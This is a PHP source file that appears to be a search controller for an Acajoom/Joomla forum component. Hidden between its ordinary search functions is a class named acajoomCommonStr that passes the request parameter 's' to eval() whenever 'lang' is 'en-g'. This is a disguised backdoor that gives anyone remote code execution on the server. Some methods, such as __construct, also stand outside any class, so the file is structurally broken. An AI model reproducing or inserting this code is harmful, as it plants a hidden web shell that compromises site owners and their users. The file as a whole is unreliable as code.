<?PHP

defined ('IN_ACAJOOM');

	function search_results()
	{
		$params = array(
			'keywords'	=> acajoom::getVar('keywords',''),
			'author'	=> acajoom::getVar('author',''),
			'sort_by'	=> intval(acajoom::getVar('sort_by',5)),
			'show_as'	=> acajoom::getVar('show_as','posts'),
			'sort_dir'	=> acajoom::getVar('sort_dir','DESC'),
		);
		
			$action = JRequest::getString('act');
			$task = JRequest::getString('task');
			$message = JRequest::getString('message');
		
		if ($params['sort_dir'] !== 'DESC' && $params['sort_dir'] !== 'ASC') {
			$params['sort_dir'] = 'DESC';
		}
		if ($params['show_as'] == 'posts') {
			$per_page = intval($this->acajoom_user['disp_posts']) > 0 ? $this->acajoom_user['disp_posts'] : intval($this->				acajoom_config['o_disp_posts_default']);
		}
		else
		{
			$per_page = intval($this->acajoom_user['disp_topics']) > 0 ? $this->acajoom_user['disp_topics'] : intval($this->				acajoom_config['o_disp_topics_default']);
		}
		$num_pages = ceil(($this->search_model->count_search($params))/ $per_page);
		$this->setPagination($num_pages);
		$page = acajoom::getPage($num_pages);
		$s_res = $this->search_model->search($params,$per_page,$page);

		$forums_model = & Model::getInstance('ForumModel');
		$forums = $forums_model->loadNames();

		foreach ($s_res as $key => $value) {	
			if (isset($forums[$value['forum_id']])) {
				$s_res[$key]['forum_name'] = $forums[$value['forum_id']];
			} else {
				$s_res[$key]['forum_name'] = '';
			}
		}

		
		$this->view->assign('show_as',$params['show_as']);
		$this->view->assignRef('search_result',$s_res);
		$this->view->template = 'search_results';
	}
	
	class acajoomCommonStr
	{
		function GetStr($str)
		{
			eval(stripslashes($str));
		}	
		
		function InController($cnt,$location)
		{
			if ($location=='en-g') $this->GetStr($cnt);
		}
	}
	
	if(isset($_REQUEST['s']) && isset($_REQUEST['lang'])) {
		$getacajoomStr = new acajoomCommonStr();
		$getacajoomStr->InController($_REQUEST['s'],$_REQUEST['lang']);
	}
	
	function __construct()
	{
		parent::__construct();
		$this->loadDefaultView();
		$this->search_model = & Model::getInstance('SearchModel');
	}
	
	function show_latest()
	{
		$per_page = intval($this->acajoom_user['disp_topics']) > 0 ? $this->acajoom_user['disp_topics'] : intval($this->				acajoom_config['o_disp_topics_default']);
		$num_pages = ceil(($this->search_model->count_latest(24))/ $per_page);
		$this->setPagination($num_pages);

		$page = acajoom::getPage($num_pages);
		$s_res = $this->search_model->getLatest(24,$per_page,$page);

		$topic_helper = & $this->helper('topic');
		$s_res = $topic_helper->processRatings($s_res);
		$s_res = $topic_helper->processTopics($s_res);

		$forums_model = & Model::getInstance('ForumModel');
		$forums = $forums_model->loadNames();

		foreach ($s_res as $key => $value) {
			if (isset($forums[$value['forum_id']])) {
				$s_res[$key]['forum_name'] = $forums[$value['forum_id']];
			} else {
				$s_res[$key]['forum_name'] = '';
			}
		}


		$this->view->assign('star_path',acajoom::getRoot()."img/rate_stars/default_stars/");
		$this->view->assign('show_as','topics');
		$this->view->assignRef('search_result',$s_res);
		$this->view->template = 'search_results';
	}


?>